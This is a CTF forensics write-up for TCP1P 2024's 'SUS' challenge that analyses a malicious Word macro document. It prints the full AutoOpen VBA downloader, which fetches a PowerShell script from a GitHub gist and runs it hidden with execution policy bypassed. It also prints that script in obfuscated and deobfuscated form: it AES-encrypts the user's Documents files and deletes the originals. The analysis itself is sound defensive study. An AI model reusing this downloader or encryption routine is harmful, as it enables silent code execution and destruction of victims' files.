---
title:  TCP1P International CTF 2024
published: 2024-10-14
description:  TCP1P International CTF 2024 with BlitzHack
tags: [CTFs, DFIR]
category: CTFs Write-up
draft: false
---

# TCP1P International CTF
### When this CTFs was occuring, our team weren't participate much, there only 3-4 person so we only managed to clear OSINT and do some Forensics challenges but some how we still placed 45/1109, anyway hope you found something useful in this write-up of mine
---
### SUS

![Sus](https://hackmd.io/_uploads/ryqnrnckyl.png)

So the Challenge gave us 2 zipped file, one contain a **Docm** and the other contains both the flag and password to unzip it but they seem to be encrypted.

![image](https://hackmd.io/_uploads/rkt9S251Je.png)

Lets investigate the Docm first, based on the extension, we already knew that it contain MacroScript.

```vbs h!
VBA MACRO Module1.bas 
in file: word/vbaProject.bin - OLE stream: u'VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
    Dim bea2b19e869d906e19c2c5845ef99d624 As String
    Dim c1d374ac555d2f2500e5eba113b6d19df As String
    Dim b3d8f69e6a1e4e380a0b578412bb4728d As Object
    Dim e9a6a8866fc9657d77dc59f191d20178e As Object
    Dim fb6c5e53b78f831ff071400fd4987886a As Object
    Dim a6482a3f94854f5920ef720dbf7944d49 As String
    Dim a7eeee37ce4d5f1ce4d968ed8fdd9bcbb As String
    Dim a3e2b2a4914ae8d53ed6948f3f0d709b9 As String
    Dim a79e6d2cfe11f015751beca1f2ad01f35 As String
    Dim c19fe1eb6132de0cf2af80dcaf58865d3 As String
    Dim e71d80072ff5e54f8ede746c30dcd1d7a As String
    Dim f7182dd21d513b01e2797c451341280d0 As String
    
    a6482a3f94854f5920ef720dbf7944d49 = "https://gist.gith"
    a7eeee37ce4d5f1ce4d968ed8fdd9bcbb = "ubusercontent.co"
    a3e2b2a4914ae8d53ed6948f3f0d709b9 = "m/daffainfo/20a7b18ee31bd6a22acd1a90c1c7acb9"
    a79e6d2cfe11f015751beca1f2ad01f35 = "/raw/670f8d57403a02169d5e63e2f705bd4652781953/test.ps1"
    c19fe1eb6132de0cf2af80dcaf58865d3 = Environ("USERPROFILE")
    e71d80072ff5e54f8ede746c30dcd1d7a = "\Docum"
    f7182dd21d513b01e2797c451341280d0 = "ents\test.ps1"
    
    bea2b19e869d906e19c2c5845ef99d624 = a6482a3f94854f5920ef720dbf7944d49 & a7eeee37ce4d5f1ce4d968ed8fdd9bcbb & a3e2b2a4914ae8d53ed6948f3f0d709b9 & a79e6d2cfe11f015751beca1f2ad01f35
    c1d374ac555d2f2500e5eba113b6d19df = c19fe1eb6132de0cf2af80dcaf58865d3 & e71d80072ff5e54f8ede746c30dcd1d7a & f7182dd21d513b01e2797c451341280d0
    Set b3d8f69e6a1e4e380a0b578412bb4728d = CreateObject("MSXML2.XMLHTTP")
    b3d8f69e6a1e4e380a0b578412bb4728d.Open "GET", bea2b19e869d906e19c2c5845ef99d624, False
    b3d8f69e6a1e4e380a0b578412bb4728d.Send
    Set e9a6a8866fc9657d77dc59f191d20178e = CreateObject("ADODB.Stream")
    e9a6a8866fc9657d77dc59f191d20178e.Type = 1
    e9a6a8866fc9657d77dc59f191d20178e.Open
    e9a6a8866fc9657d77dc59f191d20178e.Write b3d8f69e6a1e4e380a0b578412bb4728d.responseBody
    e9a6a8866fc9657d77dc59f191d20178e.SaveToFile c1d374ac555d2f2500e5eba113b6d19df, 2
    e9a6a8866fc9657d77dc59f191d20178e.Close
    Set fb6c5e53b78f831ff071400fd4987886a = CreateObject("WScript.Shell")
    fb6c5e53b78f831ff071400fd4987886a.Run "powershell.exe -ExecutionPolicy Bypass -File """ & c1d374ac555d2f2500e5eba113b6d19df & """", 0, False
    Set b3d8f69e6a1e4e380a0b578412bb4728d = Nothing
    Set e9a6a8866fc9657d77dc59f191d20178e = Nothing
    Set fb6c5e53b78f831ff071400fd4987886a = Nothing
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|ADODB.Stream        |May create a text file                       |
|Suspicious|SaveToFile          |May create a text file                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|powershell          |May run PowerShell commands                  |
|Suspicious|ExecutionPolicy     |May run PowerShell commands                  |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|MSXML2.XMLHTTP      |May download files from the Internet         |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |https://gist.gith   |URL                                          |
|IOC       |test.ps1            |Executable file name                         |
|IOC       |powershell.exe      |Executable file name                         |
+----------+--------------------+---------------------------------------------+
```

So it downloaded a powershell script and executeed it, let see what inside the ps1 script

```vbs!
a6482a3f94854f5920ef720dbf7944d49 = "https://gist.gith"
    a7eeee37ce4d5f1ce4d968ed8fdd9bcbb = "ubusercontent.co"
    a3e2b2a4914ae8d53ed6948f3f0d709b9 = "m/daffainfo/20a7b18ee31bd6a22acd1a90c1c7acb9"
    a79e6d2cfe11f015751beca1f2ad01f35 = "/raw/670f8d57403a02169d5e63e2f705bd4652781953/test.ps1"
    c19fe1eb6132de0cf2af80dcaf58865d3 = Environ("USERPROFILE")
    e71d80072ff5e54f8ede746c30dcd1d7a = "\Docum"
    f7182dd21d513b01e2797c451341280d0 = "ents\test.ps1"
```

Here is the Ps1 script:
```ps1!
function hLBKckxyHxqsbnKPcxuEltxXJgGMBEdtenTXDbrjJ {
  param (
        [byte[]]$fILecontEnt,
       [byte[]]$kEy,
  [byte[]]$iv
       )

   $wTxNPLpDKLd94wOiw4Ir9ecQJi8l7ym3AqKM2mVsyR7Sk5KD7sghlW3gm3oXNKd1Bws7xX82MZxhwERgFUw9C7YvJ5ffftPxo1p8kRQB1UZUQNiffkfdQqIEV0u1skAhCvTH6MglyDXo03BW = [sYstem.SeCurITy.CRYpTOgrapHy.aes]::Create()
  $wTxNPLpDKLd94wOiw4Ir9ecQJi8l7ym3AqKM2mVsyR7Sk5KD7sghlW3gm3oXNKd1Bws7xX82MZxhwERgFUw9C7YvJ5ffftPxo1p8kRQB1UZUQNiffkfdQqIEV0u1skAhCvTH6MglyDXo03BW.Mode = [SysTeM.secURitY.CrYPtOGrAPhy.CiPhermodE]::CBC
     $wTxNPLpDKLd94wOiw4Ir9ecQJi8l7ym3AqKM2mVsyR7Sk5KD7sghlW3gm3oXNKd1Bws7xX82MZxhwERgFUw9C7YvJ5ffftPxo1p8kRQB1UZUQNiffkfdQqIEV0u1skAhCvTH6MglyDXo03BW.Padding = [sySTEm.sEcuRITY.cRypTOGRAphY.PAdDINgMOdE]::PKCS7
 $wTxNPLpDKLd94wOiw4Ir9ecQJi8l7ym3AqKM2mVsyR7Sk5KD7sghlW3gm3oXNKd1Bws7xX82MZxhwERgFUw9C7YvJ5ffftPxo1p8kRQB1UZUQNiffkfdQqIEV0u1skAhCvTH6MglyDXo03BW.Key = $kEy
    $wTxNPLpDKLd94wOiw4Ir9ecQJi8l7ym3AqKM2mVsyR7Sk5KD7sghlW3gm3oXNKd1Bws7xX82MZxhwERgFUw9C7YvJ5ffftPxo1p8kRQB1UZUQNiffkfdQqIEV0u1skAhCvTH6MglyDXo03BW.IV = $iv

    $4ZpO3FrslYBfVuEShaxppH8Zf9HelBcL1FxNFaiAcjxYNwzBAHGKSqaaGPMNzUrSVlQoruGFnUvyoZ9C7r6E8WBNg8yYbyssax2zMD65rC6DieNrucmPbwiQ4nYJayTvj1I3ssiq5YAbBkoADqgpIDH6iOUh07Iq9e4ORYeVKveFRv5aHxPdC7nXSh7FnXhgtJSuu7eYGdAqz0I88GquEPxf58nMqDIZP9MQGOrdChcMf0zyA19TPGeNILQjC7eCeOPwiLvdy0DEfMMxOuFZx5Ou3PwEwwb9qzGOgr6SZUczRXgEYdwU0MJxLyFa5vaBSdFlL1goffcJ1VlRRC087j3LZOTT30I6MCN16Sw9CtUooJk45GknpBZhJCbKErCC0so2xzYaNjiAXiZe9A5xY7GNyS4Z4r5VZDTyZ1UleUYqvKkhe2yCkn33o7r58EzAHveKoZxPnbSZfTExpUjtheb6Ir22bCWOr2sOKcxuHD8RVfyMf2YZxQvtKZD3Ens7oijHO8r8RCXJdUYtfAqj2k7WPWXu4OZabgat88t9iw2ZxrlpKGLBUGG3oN3qfWLHCYJolp0HsQe3vCxjRRsSArsElUGVcil8yx8UEzds4SDSCPcKtwo3KPGOYq6VCu0i6BR4FyiFiC8GaZBwbaMg7gdEOGDorLZi9rWFBo8cCP7Z3NeWa1CS0FfmcCw9sMnH2GBzyUTwdyfgonyYv60lF2AZuw8oBZ23XoIVsF = $wTxNPLpDKLd94wOiw4Ir9ecQJi8l7ym3AqKM2mVsyR7Sk5KD7sghlW3gm3oXNKd1Bws7xX82MZxhwERgFUw9C7YvJ5ffftPxo1p8kRQB1UZUQNiffkfdQqIEV0u1skAhCvTH6MglyDXo03BW.CreateEncryptor()
   $DXXz8S7pnOuaDS9FGQAjFPedgyTLKRAo0VrSiEeapMS2KhDtpkl5pKgvcOWX2alqTTjzLGZdhlk89fvJSVnz60ULMAqbhqtk3RBNknNlTyVwsVfCHPscnLcJ1t5lnqWk5Fgavou4verArREYROVobRJheCuAIHadaRAWsLav9L9IvkjyrQRLWEZDeax8yiqLL2jq3XhgEZBiIwRcKVWEzzu1nKUPH4ZD8lLJMWaR9PeOkU4Is24EhvSaWiO9KDHsdqXjRdiVwg3lgeKpmrL6W1eujyZrgLZ2HxjZKQTICYQJDzusj5bEIDKCLjRSbw3p6Tgq2pDBSQ5kQ6DS6N2OKQYnzZ1qAA0lzftsg3b8FwM36shlBE0ToDeNrl4FkKDB6UQKxK1lcbO2tahobkh9XnUbKVvPKCzctMPuEmmKohLc6m3d5xo0Jk8Ge39tmNkO6W4CEg0t3LsTSyUlhFyUY8ePj1PEPEWMCxj8VW0CGAe7Z2jnJQdj431g5HEGtw32LBpxq4k85XtQ00UsOZTgg00HPGs4061TjREcskVs2IEZSgKwLW1SCyBa1FDfxiC1IH6PDrTKd2tLvfgWr1bgwqL5wlIWQQ64MgGxqhnaZq = $4ZpO3FrslYBfVuEShaxppH8Zf9HelBcL1FxNFaiAcjxYNwzBAHGKSqaaGPMNzUrSVlQoruGFnUvyoZ9C7r6E8WBNg8yYbyssax2zMD65rC6DieNrucmPbwiQ4nYJayTvj1I3ssiq5YAbBkoADqgpIDH6iOUh07Iq9e4ORYeVKveFRv5aHxPdC7nXSh7FnXhgtJSuu7eYGdAqz0I88GquEPxf58nMqDIZP9MQGOrdChcMf0zyA19TPGeNILQjC7eCeOPwiLvdy0DEfMMxOuFZx5Ou3PwEwwb9qzGOgr6SZUczRXgEYdwU0MJxLyFa5vaBSdFlL1goffcJ1VlRRC087j3LZOTT30I6MCN16Sw9CtUooJk45GknpBZhJCbKErCC0so2xzYaNjiAXiZe9A5xY7GNyS4Z4r5VZDTyZ1UleUYqvKkhe2yCkn33o7r58EzAHveKoZxPnbSZfTExpUjtheb6Ir22bCWOr2sOKcxuHD8RVfyMf2YZxQvtKZD3Ens7oijHO8r8RCXJdUYtfAqj2k7WPWXu4OZabgat88t9iw2ZxrlpKGLBUGG3oN3qfWLHCYJolp0HsQe3vCxjRRsSArsElUGVcil8yx8UEzds4SDSCPcKtwo3KPGOYq6VCu0i6BR4FyiFiC8GaZBwbaMg7gdEOGDorLZi9rWFBo8cCP7Z3NeWa1CS0FfmcCw9sMnH2GBzyUTwdyfgonyYv60lF2AZuw8oBZ23XoIVsF.TransformFinalBlock($fILecontEnt, 0, $fILecontEnt.Length)

       $wTxNPLpDKLd94wOiw4Ir9ecQJi8l7ym3AqKM2mVsyR7Sk5KD7sghlW3gm3oXNKd1Bws7xX82MZxhwERgFUw9C7YvJ5ffftPxo1p8kRQB1UZUQNiffkfdQqIEV0u1skAhCvTH6MglyDXo03BW.Dispose()
 return $DXXz8S7pnOuaDS9FGQAjFPedgyTLKRAo0VrSiEeapMS2KhDtpkl5pKgvcOWX2alqTTjzLGZdhlk89fvJSVnz60ULMAqbhqtk3RBNknNlTyVwsVfCHPscnLcJ1t5lnqWk5Fgavou4verArREYROVobRJheCuAIHadaRAWsLav9L9IvkjyrQRLWEZDeax8yiqLL2jq3XhgEZBiIwRcKVWEzzu1nKUPH4ZD8lLJMWaR9PeOkU4Is24EhvSaWiO9KDHsdqXjRdiVwg3lgeKpmrL6W1eujyZrgLZ2HxjZKQTICYQJDzusj5bEIDKCLjRSbw3p6Tgq2pDBSQ5kQ6DS6N2OKQYnzZ1qAA0lzftsg3b8FwM36shlBE0ToDeNrl4FkKDB6UQKxK1lcbO2tahobkh9XnUbKVvPKCzctMPuEmmKohLc6m3d5xo0Jk8Ge39tmNkO6W4CEg0t3LsTSyUlhFyUY8ePj1PEPEWMCxj8VW0CGAe7Z2jnJQdj431g5HEGtw32LBpxq4k85XtQ00UsOZTgg00HPGs4061TjREcskVs2IEZSgKwLW1SCyBa1FDfxiC1IH6PDrTKd2tLvfgWr1bgwqL5wlIWQQ64MgGxqhnaZq
}

function WcxUfvPWkvdEVTxpneCnitDtrlZHcKcSeHVCeaEp {
  param (
[string]$fOlDErPATH,
       [byte[]]$kEy,
   [byte[]]$iv
  )

        $ruwyDTHxzj2yBGWIPwvbLpJnNrJOcjfEwbNAYo22RfjY5OoHUzHkddzfFgxti8eorqWgjcyHAnQ9UmDQBRPOd4FAnE9NSX2291RTqvXgJqElPncuBwkR00iFiJV56fvqTRf4KGpxC1gu8xZOcSUgl52IOnbtkxSwsKuyFL0cg3eKixJwUPFzrVBxQGxBVl9XLg1yJvzLhKLPdxoHx0CJSoIkb32GMwmEocab0TKn2OW4q5wlQYwcuuPoT6HNSMjm8l9Xtrw9HtKNXgwkgF1v4pl4Gl6TKC23qONwmpb0dpgA6PuHfZNGEdvLeVepSB6Uk1xIcEZupXGNBoh1RAxpU8fyFzdz2wR1wjJ2WfQYzglkldSkJ91bTq4Lw3ryqLbD8dvSAEbHtFvMMlj2UWOOUz1izDA3ClSHG8HDKBU9fwmWWTJ9Vkttn0kXN4TidTGWXsMQzEmhWaejsrx3tuaJOkjTbakAr3FM8hKYwZa0B9l4XzCcjNS1VjI0vYce6P9grcrwVzC4stLz03haaD7zCNYpfI4dR2vZwhxWUCSX6ENCL5gSKQ9oiSTKdAxFeENgvijkVywmepxoZvnY7foTVyn577oJou7hO5l0f5lmVSCPDRtGDb37XPMWFwTbiQZYcO3538aMKGXs7ssxSGD6tXM0VTF7zfuup2PlqmJt8ynIvtNhasiFVqjEUDliWUnaQhShdfvO6ZenHvTAVwPlHD47VvNKWTfUku6rr04Hfh9MB16vQp3OYDc5of0FsCE58gMo3QQOIUYjgyKjQ229o2jxleSJifhoKd4sYvwVz27xU3lQWrhFvi5ig4MZgDB0HiXFkjwWRI17ePVUZ91uyNmHNOgp5HLtnSKT3oS64fbThuZmndmxiQfECivujcSKXROqdxdvMd52ZLWafN7C9mc6TGHe6xrMYAx4AwQDi2g7Us = Get-ChildItem -Path $fOlDErPATH -File
  foreach ($fILE in $ruwyDTHxzj2yBGWIPwvbLpJnNrJOcjfEwbNAYo22RfjY5OoHUzHkddzfFgxti8eorqWgjcyHAnQ9UmDQBRPOd4FAnE9NSX2291RTqvXgJqElPncuBwkR00iFiJV56fvqTRf4KGpxC1gu8xZOcSUgl52IOnbtkxSwsKuyFL0cg3eKixJwUPFzrVBxQGxBVl9XLg1yJvzLhKLPdxoHx0CJSoIkb32GMwmEocab0TKn2OW4q5wlQYwcuuPoT6HNSMjm8l9Xtrw9HtKNXgwkgF1v4pl4Gl6TKC23qONwmpb0dpgA6PuHfZNGEdvLeVepSB6Uk1xIcEZupXGNBoh1RAxpU8fyFzdz2wR1wjJ2WfQYzglkldSkJ91bTq4Lw3ryqLbD8dvSAEbHtFvMMlj2UWOOUz1izDA3ClSHG8HDKBU9fwmWWTJ9Vkttn0kXN4TidTGWXsMQzEmhWaejsrx3tuaJOkjTbakAr3FM8hKYwZa0B9l4XzCcjNS1VjI0vYce6P9grcrwVzC4stLz03haaD7zCNYpfI4dR2vZwhxWUCSX6ENCL5gSKQ9oiSTKdAxFeENgvijkVywmepxoZvnY7foTVyn577oJou7hO5l0f5lmVSCPDRtGDb37XPMWFwTbiQZYcO3538aMKGXs7ssxSGD6tXM0VTF7zfuup2PlqmJt8ynIvtNhasiFVqjEUDliWUnaQhShdfvO6ZenHvTAVwPlHD47VvNKWTfUku6rr04Hfh9MB16vQp3OYDc5of0FsCE58gMo3QQOIUYjgyKjQ229o2jxleSJifhoKd4sYvwVz27xU3lQWrhFvi5ig4MZgDB0HiXFkjwWRI17ePVUZ91uyNmHNOgp5HLtnSKT3oS64fbThuZmndmxiQfECivujcSKXROqdxdvMd52ZLWafN7C9mc6TGHe6xrMYAx4AwQDi2g7Us) {
   $fILEcontenT = [sysTeM.iO.fILe]::ReadAllBytes($fILE.FullName)
    $tgLjoPhM5puXcpTyAOIdjMb6OG9958nEI5Lx5piyjqm8M0abTMc1nCOYEEIBEjPOa0zajfg9Mgz5u87NGwOB32Ddo6VSkdMYnooOLzQtvUfpyFts8DKDo8BR1o2WBtMcwbPHS1t0nh8Bls9GxSVzE3stsmuQLDDgsI3BNJUe9DHX7iqnbGW5dtIOdCOyHQNBArVmCP3ylp2IWfLgDg9FUGtbXLkfSyNFHRkBK7b3HcKiYrXGBeAUbRW2E2PzfUElFGGPuJoBothFXCg6DPMlujc8OUPXpf5G6doRsDCChq94RHkYwluiczWsVpaiaxdHw3FG4xwsmtqSvclHZwN4Zuz4fTGTdlwcnWw402QytPUmChOTzIymO3fYcHTbxRnewQLgl6ekCrcJAtfNFiG2Qluxhd8wVFTUcgYR2Bhjscovwq3T6CxwehUZbdcrUJCcOJmlNmr2kHU5rBJDDM0DZ9iO9w5MtRTeS0LqMb2Phzztrr1u6uLa6nhdcxIapxAXXgM9CzTEcaDrxKAb8dqft83oD0TVhVuc3V0ChuTuOveivUWldgB0QqlDX02Lw2IVr2IMz0vA867As4KaA4RI2su7jQwsmw = hLBKckxyHxqsbnKPcxuEltxXJgGMBEdtenTXDbrjJ -FileContent $fILEcontenT -Key $kEy -IV $iv
 $S9uNiOu8MdsYWgx5NirCL84sYs3Y2bSQyyFDeSPfRvryc5qOATTztuCQlynrBn2ebciJeqTohssNMewKE7sYUvUhLnco9khiZk4TMbhPg2rWgyMB3d4ZnGY3r5Y0iVGh6RZ4u4GRbfCQRp4H2LZ85o6e4GvBILwEZGMcSycGTUcsUSHU9kMGdVqQIisI4GSQf2k1yEXpBFbOsT3cWX1VFVWYBkxv0Emxi5BUDo = $fILE.FullName + ("{0}{2}{1}" -f '.','nc','e')
     [sysTeM.iO.fILe]::WriteAllBytes($S9uNiOu8MdsYWgx5NirCL84sYs3Y2bSQyyFDeSPfRvryc5qOATTztuCQlynrBn2ebciJeqTohssNMewKE7sYUvUhLnco9khiZk4TMbhPg2rWgyMB3d4ZnGY3r5Y0iVGh6RZ4u4GRbfCQRp4H2LZ85o6e4GvBILwEZGMcSycGTUcsUSHU9kMGdVqQIisI4GSQf2k1yEXpBFbOsT3cWX1VFVWYBkxv0Emxi5BUDo, $tgLjoPhM5puXcpTyAOIdjMb6OG9958nEI5Lx5piyjqm8M0abTMc1nCOYEEIBEjPOa0zajfg9Mgz5u87NGwOB32Ddo6VSkdMYnooOLzQtvUfpyFts8DKDo8BR1o2WBtMcwbPHS1t0nh8Bls9GxSVzE3stsmuQLDDgsI3BNJUe9DHX7iqnbGW5dtIOdCOyHQNBArVmCP3ylp2IWfLgDg9FUGtbXLkfSyNFHRkBK7b3HcKiYrXGBeAUbRW2E2PzfUElFGGPuJoBothFXCg6DPMlujc8OUPXpf5G6doRsDCChq94RHkYwluiczWsVpaiaxdHw3FG4xwsmtqSvclHZwN4Zuz4fTGTdlwcnWw402QytPUmChOTzIymO3fYcHTbxRnewQLgl6ekCrcJAtfNFiG2Qluxhd8wVFTUcgYR2Bhjscovwq3T6CxwehUZbdcrUJCcOJmlNmr2kHU5rBJDDM0DZ9iO9w5MtRTeS0LqMb2Phzztrr1u6uLa6nhdcxIapxAXXgM9CzTEcaDrxKAb8dqft83oD0TVhVuc3V0ChuTuOveivUWldgB0QqlDX02Lw2IVr2IMz0vA867As4KaA4RI2su7jQwsmw)
   Remove-Item $fILE.FullName
}
}

$kNTZHxWPKrOOROlpTvAyhuwGsegbxRPP0YBomB1ACpvkVBTc18Emj8lEGi4sPSA6xtLD0ToTaHcJF0m5Z2NKzjiF6DRdlVAfxFPFeYQ0Hhv8gjVDzPpH190fAesz = ("{4}{2}{9}{0}{7}{1}{5}{8}{3}{6}" -f '9PPHYu', 'VO2/HR', 'iu0qar', 'DBAUGB','K34VFi',  'pVrif', 'wgJCgsMDQ4P', 'e/KNLM','ikAAQI' , '9xWICc')
$kGWOOSVtqfxVCoXZVTCBu3nsOb2lJzP4Hb2ISBI8ZusTErhwdoCItM1qz8pP1ueeLscgyiPbBsOpoF3qVGWEwRlZ33XUT16TKhGlgCQwExeJMw2fCff3EymlFljE0SuJBoN71zIFwBezXGpARrAUI84Jro369CbPdJhI3Q3QwzyDYrgKvdpdxkprOuUvNvOqxTX3vaH0MVfDWAHCqQd6vKeZxYDqwfxJkgHdha7TFUiVSN58Ch0cClxDdnhBH37DSdPr335m8FY8u08bwcJeIOaWWKcQtl19vowhiYPjJ0NIV32TXOoeZja6AZuGM1cXygCGyg0DXXfaiDyYfJjPaypFlqaD3fg3fi0dtYRGVqQ0iZ2Owynmp8XlUZMko8IgNjd9hGgmf510SjFueala5ZSeeOEqb3PG85AGMQlbto6JDO2IsAOjjP0S4R7ZeEcGumWwLdUbAlMh8qELHrKv4CqsCa9ufRHX7ZYDmwPu2wux63xBjwJ4BiJZvEzKxfAvaXyhAteq2N1K7iEKsXsNbSGn1VidtvkO3gQw1qKN9yCY6DwrCD5MLiNIMV6USgZa3sya5zqN194ckT3VHwd3UK9HeZokwtgkR9hwWUdaaRZrT91qJg4G2hwxDouu35mZjQrgsRvrEehwsoDmFHSNCjNIAzfFC8RGUyB2qSpJc3PRNFwvwJ9eCB7BjaGHxhweJFqF3gP8NtgnH5kVs3TiO7Qld5Zis8t38McSeDcZVXDLRP7nK9mRePyrW4IdhktDg1bpsbhMTUgsacD4Sb6GCnABIwzrjvzltuSPKNsruF3qebC67YyYk7I8Ei3vuU94oexSvkxcxV0KNC41s7uq9mY0zVhAMuNl7Vbej1taJoOYhZfeK6D32VcfSDZFbmDBi57tR6SnIzyLnnWfEwS6Yv0RVwR7gGHX0brNL1U8IuG4Ya7nLbgqViwR2mgwambCdQUPOnNMWqBmJcNaYCl = [SYStEM.COnVERt]::FromBase64String($kNTZHxWPKrOOROlpTvAyhuwGsegbxRPP0YBomB1ACpvkVBTc18Emj8lEGi4sPSA6xtLD0ToTaHcJF0m5Z2NKzjiF6DRdlVAfxFPFeYQ0Hhv8gjVDzPpH190fAesz)

$kEy = $kGWOOSVtqfxVCoXZVTCBu3nsOb2lJzP4Hb2ISBI8ZusTErhwdoCItM1qz8pP1ueeLscgyiPbBsOpoF3qVGWEwRlZ33XUT16TKhGlgCQwExeJMw2fCff3EymlFljE0SuJBoN71zIFwBezXGpARrAUI84Jro369CbPdJhI3Q3QwzyDYrgKvdpdxkprOuUvNvOqxTX3vaH0MVfDWAHCqQd6vKeZxYDqwfxJkgHdha7TFUiVSN58Ch0cClxDdnhBH37DSdPr335m8FY8u08bwcJeIOaWWKcQtl19vowhiYPjJ0NIV32TXOoeZja6AZuGM1cXygCGyg0DXXfaiDyYfJjPaypFlqaD3fg3fi0dtYRGVqQ0iZ2Owynmp8XlUZMko8IgNjd9hGgmf510SjFueala5ZSeeOEqb3PG85AGMQlbto6JDO2IsAOjjP0S4R7ZeEcGumWwLdUbAlMh8qELHrKv4CqsCa9ufRHX7ZYDmwPu2wux63xBjwJ4BiJZvEzKxfAvaXyhAteq2N1K7iEKsXsNbSGn1VidtvkO3gQw1qKN9yCY6DwrCD5MLiNIMV6USgZa3sya5zqN194ckT3VHwd3UK9HeZokwtgkR9hwWUdaaRZrT91qJg4G2hwxDouu35mZjQrgsRvrEehwsoDmFHSNCjNIAzfFC8RGUyB2qSpJc3PRNFwvwJ9eCB7BjaGHxhweJFqF3gP8NtgnH5kVs3TiO7Qld5Zis8t38McSeDcZVXDLRP7nK9mRePyrW4IdhktDg1bpsbhMTUgsacD4Sb6GCnABIwzrjvzltuSPKNsruF3qebC67YyYk7I8Ei3vuU94oexSvkxcxV0KNC41s7uq9mY0zVhAMuNl7Vbej1taJoOYhZfeK6D32VcfSDZFbmDBi57tR6SnIzyLnnWfEwS6Yv0RVwR7gGHX0brNL1U8IuG4Ya7nLbgqViwR2mgwambCdQUPOnNMWqBmJcNaYCl[0..31]

$iv = $kGWOOSVtqfxVCoXZVTCBu3nsOb2lJzP4Hb2ISBI8ZusTErhwdoCItM1qz8pP1ueeLscgyiPbBsOpoF3qVGWEwRlZ33XUT16TKhGlgCQwExeJMw2fCff3EymlFljE0SuJBoN71zIFwBezXGpARrAUI84Jro369CbPdJhI3Q3QwzyDYrgKvdpdxkprOuUvNvOqxTX3vaH0MVfDWAHCqQd6vKeZxYDqwfxJkgHdha7TFUiVSN58Ch0cClxDdnhBH37DSdPr335m8FY8u08bwcJeIOaWWKcQtl19vowhiYPjJ0NIV32TXOoeZja6AZuGM1cXygCGyg0DXXfaiDyYfJjPaypFlqaD3fg3fi0dtYRGVqQ0iZ2Owynmp8XlUZMko8IgNjd9hGgmf510SjFueala5ZSeeOEqb3PG85AGMQlbto6JDO2IsAOjjP0S4R7ZeEcGumWwLdUbAlMh8qELHrKv4CqsCa9ufRHX7ZYDmwPu2wux63xBjwJ4BiJZvEzKxfAvaXyhAteq2N1K7iEKsXsNbSGn1VidtvkO3gQw1qKN9yCY6DwrCD5MLiNIMV6USgZa3sya5zqN194ckT3VHwd3UK9HeZokwtgkR9hwWUdaaRZrT91qJg4G2hwxDouu35mZjQrgsRvrEehwsoDmFHSNCjNIAzfFC8RGUyB2qSpJc3PRNFwvwJ9eCB7BjaGHxhweJFqF3gP8NtgnH5kVs3TiO7Qld5Zis8t38McSeDcZVXDLRP7nK9mRePyrW4IdhktDg1bpsbhMTUgsacD4Sb6GCnABIwzrjvzltuSPKNsruF3qebC67YyYk7I8Ei3vuU94oexSvkxcxV0KNC41s7uq9mY0zVhAMuNl7Vbej1taJoOYhZfeK6D32VcfSDZFbmDBi57tR6SnIzyLnnWfEwS6Yv0RVwR7gGHX0brNL1U8IuG4Ya7nLbgqViwR2mgwambCdQUPOnNMWqBmJcNaYCl[32..47]

$fOlDErPATH = ("$enV:USERPROFILE{4}{0}{3}" -F'umen','\Wo', 'i', 'ts', '\Doc')

WcxUfvPWkvdEVTxpneCnitDtrlZHcKcSeHVCeaEp -FolderPath $fOlDErPATH -Key $kEy -IV $iv
```

It got obfuscated, but you can still see that it use base64, key and IV, so it must be using base64 to encode the file first then AES encrypt it, let deobfuscate it shall we?

```ps1!
function lmao {
  param (
        [byte[]]$fILecontEnt,
       [byte[]]$kEy,
  [byte[]]$iv
       )

   $AES_ = [sYstem.SeCurITy.CRYpTOgrapHy.aes]::Create()
  $AES_.Mode = [SysTeM.secURitY.CrYPtOGrAPhy.CiPhermodE]::CBC
     $AES_.Padding = [sySTEm.sEcuRITY.cRypTOGRAphY.PAdDINgMOdE]::PKCS7
 $AES_.Key = $kEy
    $AES_.IV = $iv

    $func2 = $enc.CreateEncryptor()
   $abc = $func2.TransformFinalBlock($fILecontEnt, 0, $fILecontEnt.Length)

       $enc.Dispose()
 return $abc
}

function lmaolmao {
  param (
[string]$fOlDErPATH,
       [byte[]]$kEy,
   [byte[]]$iv
  )

        $pc = Get-ChildItem -Path $fOlDErPATH -File
  foreach ($fILE in $pc) {
   $fILEcontenT = [sysTeM.iO.fILe]::ReadAllBytes($fILE.FullName)
    $path = lmao -FileContent $fILEcontenT -Key $kEy -IV $iv
 $name = $fILE.FullName + ("{0}{2}{1}" -f '.','nc','e')
     [sysTeM.iO.fILe]::WriteAllBytes($name, $path)
   Remove-Item $fILE.FullName
}
}

$data = ("{4}{2}{9}{0}{7}{1}{5}{8}{3}{6}" -f '9PPHYu', 'VO2/HR', 'iu0qar', 'DBAUGB','K34VFi',  'pVrif', 'wgJCgsMDQ4P', 'e/KNLM','ikAAQI' , '9xWICc')
$base64 = [SYStEM.COnVERt]::FromBase64String($data)

$kEy = $base64[0..31]

$iv = $base64[32..47]

$fOlDErPATH = ("$enV:USERPROFILE{4}{0}{3}" -F'umen','\Wo', 'i', 'ts', '\Doc')

lmaolmao -FolderPath $fOlDErPATH -Key $kEy -IV $iv
```

Okay so after deobfs we can clearly see the key and iv it use for encryption, anyway here is my code to get the key and IV

```py!
import base64
data = "{4}{2}{9}{0}{7}{1}{5}{8}{3}{6}".format(
    '9PPHYu', 'VO2/HR', 'iu0qar', 'DBAUGB', 'K34VFi', 'pVrif', 'wgJCgsMDQ4P', 'e/KNLM', 'ikAAQI', '9xWICc'
)


base64_bytes = base64.b64decode(data)
key = base64_bytes[0:32]  
iv = base64_bytes[32:48]  

key_hex = key.hex()
iv_hex = iv.hex()
print("Key (Hex):", key_hex)
print("IV (Hex):", iv_hex)
```

